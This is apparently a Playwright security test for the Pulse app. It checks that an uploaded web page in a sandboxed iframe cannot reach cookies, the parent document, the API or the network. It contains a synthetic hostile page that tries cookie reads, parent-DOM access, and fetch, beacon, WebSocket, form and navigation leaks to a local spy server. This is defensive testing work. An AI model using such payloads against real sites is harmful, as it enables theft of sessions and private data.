// DOCS-RICH security: an uploaded web page in a doc cannot read Pulse's cookies, the doc around it, or the API, and cannot
// send anything anywhere. A real Chromium opens a "doc" (a page holding a session cookie its own scripts could read, and a
// secret in its DOM) with the page in the iframe exactly as the doc page makes it (lib/doc-rich.mjs FRAME_SANDBOX), served
// through the real web proxy (createApiProxy) from an API that answers with a weak policy on purpose: the proxy's own
// FRAME_CSP must win. The page then tries everything a hostile page would. A second local origin records any leak.
// Skips (with a reason) where Playwright's Chromium is not installed.
import assert from 'node:assert/strict';
import { createServer } from 'node:http';
import test from 'node:test';
import { createApiProxy, v0ProxyOptions } from '../../../apps/web/app/api/proxy.mjs';
import { FRAME_SANDBOX, frameHeight } from '../../../apps/web/app/lib/doc-rich.mjs';
import { framePage } from '../dist/doc-rich.js';

process.env.PULSE_PUBLIC_LOGIN_ENABLED = '1'; process.env.PULSE_PUBLIC_URL = 'https://pulse.example.test';
const FILE = '0f8fad5b-d9cb-469f-a165-70867728950e';
let pw = null;
try { pw = await import('../../../tests/e2e/node_modules/@playwright/test/index.mjs'); } catch { /* skipped below */ }

const listen = (handler) => new Promise((done) => { const s = createServer(handler); s.listen(0, '127.0.0.1', () => done(s)); });
const hostile = (spy) => `<!doctype html><html><head><title>Hostile analysis (synthetic)</title>
<link rel="stylesheet" href="${spy}/style.css"><script src="${spy}/evil.js"></script></head><body style="margin:0">
<h1>Looks like an analysis</h1><div style="height:900px">tall content</div>
<form id="f" action="${spy}/form" method="post" target="_top"><input name="x" value="1"></form>
<script>
(async () => {
  const R = { origin: String(self.origin) };
  const t = async (k, f) => { try { R[k] = 'allowed:' + String(await f()).slice(0, 120); } catch (e) { R[k] = 'blocked:' + ((e && e.name) || 'Error'); } };
  await t('cookie', () => document.cookie);
  await t('storage', () => localStorage.getItem('x'));
  await t('parentDom', () => parent.document.getElementById('secret').textContent);
  await t('parentCookie', () => parent.document.cookie);
  await t('fetchApi', () => fetch('/api/v0/me', { credentials: 'include' }).then((r) => r.text()));
  await t('fetchSpy', () => fetch('${spy}/fetch', { method: 'POST', body: 'leak', mode: 'no-cors' }).then(() => 'sent'));
  await t('xhr', () => new Promise((ok, no) => { const x = new XMLHttpRequest(); x.open('GET', '/api/v0/me'); x.onload = () => ok(x.responseText); x.onerror = () => no(new TypeError('xhr')); x.send(); }));
  await t('beacon', () => navigator.sendBeacon('${spy}/beacon', 'leak'));
  await t('image', () => new Promise((ok, no) => { const i = new Image(); i.onload = () => ok('loaded'); i.onerror = () => no(new TypeError('img')); i.src = '${spy}/img.png'; }));
  await t('socket', () => new Promise((ok, no) => { const w = new WebSocket('${spy.replace('http', 'ws')}/ws'); w.onopen = () => ok('open'); w.onerror = () => no(new TypeError('ws')); }));
  await t('popup', () => { const w = window.open('${spy}/popup'); if (!w) throw new TypeError('no window'); return 'opened'; });
  await t('form', () => { document.getElementById('f').submit(); return 'submitted'; });
  await t('topNav', () => { top.location.href = '${spy}/top'; return 'navigated'; });
  await t('alert', () => { alert('x'); return 'shown'; });
  parent.postMessage({ pulseFrame: 'navigate', url: '${spy}/via-parent' }, '*');
  parent.postMessage({ pulseFrame: 'height', height: 1e9 }, '*');
  await new Promise((ok) => setTimeout(ok, 400));
  parent.postMessage({ pulseTest: R }, '*');
})();
</script></body></html>`;

test('an uploaded page is sealed: no cookies, no doc, no API, no network, no top navigation', { skip: pw ? false : 'Playwright is not installed here', timeout: 90_000 }, async (t) => {
  const leaks = [];
  const spy = await listen((req, res) => { leaks.push(`${req.method} ${req.url}`); res.writeHead(200, { 'content-type': 'text/plain', 'access-control-allow-origin': '*' }); res.end('ok'); });
  spy.on('upgrade', (req, socket) => { leaks.push(`UPGRADE ${req.url}`); socket.destroy(); });
  const spyUrl = `http://127.0.0.1:${spy.address().port}`;
  const seen = [];
  // The API's answer for the frame, with a weak policy: the proxy must replace it with its own.
  const proxy = createApiProxy({ ...v0ProxyOptions, fetchImpl: async () => new Response(framePage(hostile(spyUrl)), { status: 200,
    headers: { 'content-type': 'text/html', 'content-security-policy': "default-src * 'unsafe-inline'" } }) });
  const app = await listen(async (req, res) => {
    seen.push({ url: req.url, cookie: req.headers.cookie ?? '' });
    if (req.url === '/doc') {
      res.writeHead(200, { 'content-type': 'text/html', 'set-cookie': 'pulse_session=SYNTHETIC-SESSION; Path=/; SameSite=Lax' });
      res.end(`<!doctype html><title>Doc</title><div id="secret">PARENT-SECRET</div>
        <iframe id="f" sandbox="${FRAME_SANDBOX}" src="/api/v0/docs/frames/${FILE}" referrerpolicy="no-referrer" allow="" style="width:600px;height:300px"></iframe>
        <script>const frameHeight = ${frameHeight.toString()}; window.__msgs = [];
        addEventListener('message', (e) => { const f = document.getElementById('f'); if (e.source !== f.contentWindow) return; window.__msgs.push(e.data);
          if (e.data && e.data.pulseTest) window.__results = e.data.pulseTest; const h = frameHeight(e.data); if (h !== null) f.style.height = h + 'px'; });</script>`);
      return;
    }
    if (req.url === `/api/v0/docs/frames/${FILE}`) {
      const r = await proxy(new Request(`https://pulse.example.test${req.url}`, { headers: { host: 'pulse.example.test', cookie: req.headers.cookie ?? '', 'sec-fetch-dest': req.headers['sec-fetch-dest'] ?? '' } }),
        { params: Promise.resolve({ path: ['docs', 'frames', FILE] }) });
      const headers = Object.fromEntries(r.headers.entries());
      res.writeHead(r.status, { ...headers, 'x-frame-options': 'SAMEORIGIN' }); res.end(Buffer.from(await r.arrayBuffer()));
      return;
    }
    if (req.url === '/api/v0/me') { res.writeHead(200, { 'content-type': 'application/json' }); res.end(req.headers.cookie?.includes('SYNTHETIC-SESSION') ? '{"secret":"API-SECRET"}' : '{}'); return; }
    res.writeHead(404); res.end();
  });
  const base = `http://127.0.0.1:${app.address().port}`;
  let browser;
  try { browser = await pw.chromium.launch(); } catch (e) { t.skip(`Chromium does not start here: ${String(e).slice(0, 120)}`); app.close(); spy.close(); return; }
  try {
    const page = await browser.newPage();
    const dialogs = [];
    page.on('dialog', (d) => { dialogs.push(d.message()); void d.dismiss(); });
    page.on('popup', (p) => dialogs.push(`popup ${p.url()}`));
    await page.goto(`${base}/doc`);
    await page.waitForFunction(() => window.__results, null, { timeout: 30_000 });
    const R = await page.evaluate(() => window.__results);
    const frameResponse = seen.find((s) => s.url.startsWith('/api/v0/docs/frames/'));
    assert.ok(frameResponse?.cookie.includes('SYNTHETIC-SESSION'), 'the frame itself is loaded with the session (the API checks who may see the page)');
    assert.equal(R.origin, 'null', 'the page runs in an opaque origin, not Pulse\'s');
    for (const k of ['cookie', 'storage', 'parentDom', 'parentCookie', 'fetchApi', 'fetchSpy', 'xhr', 'image', 'socket', 'popup']) assert.match(R[k], /^blocked:/, `${k}: ${R[k]}`);
    // a form submit or a top navigation may "succeed" without an error; that they went nowhere is checked below (no leak, same URL)
    assert.ok(R.form && R.topNav, 'the form and top-navigation tries ran');
    assert.ok(R.beacon, 'the beacon try ran (sendBeacon only queues; the policy stops it on the way out: no leak, checked below)');
    assert.deepEqual(dialogs, [], 'no dialog or pop-up opened (without allow-modals the alert() call is ignored, not thrown)');
    await new Promise((ok) => setTimeout(ok, 500));
    assert.deepEqual(leaks, [], `nothing reached another origin: ${leaks.join(', ')}`);
    assert.ok(!seen.some((s) => s.url === '/api/v0/me'), 'the API was never called');
    assert.equal(page.url(), `${base}/doc`, 'the doc was not navigated away');
    assert.equal(await page.locator('#f').evaluate((el) => el.style.height), '8000px', 'only a height (clamped) is taken from the page');
    assert.equal(await page.locator('#secret').textContent(), 'PARENT-SECRET');
    // opened on its own (a link sent to someone), the page is refused: it only ever runs inside a doc's frame
    const direct = await browser.newPage();
    const resp = await direct.goto(`${base}/api/v0/docs/frames/${FILE}`);
    assert.equal(resp.status(), 403);
    assert.match(resp.headers()['content-security-policy'], /sandbox/);
    assert.equal(await direct.textContent('body'), 'Open the doc in Vitals to see this page.');
    await direct.waitForTimeout(600);
    assert.deepEqual(leaks, [], `nothing reached another origin when opened directly: ${leaks.join(', ')}`);
  } finally { await browser.close(); app.close(); spy.close(); }
});
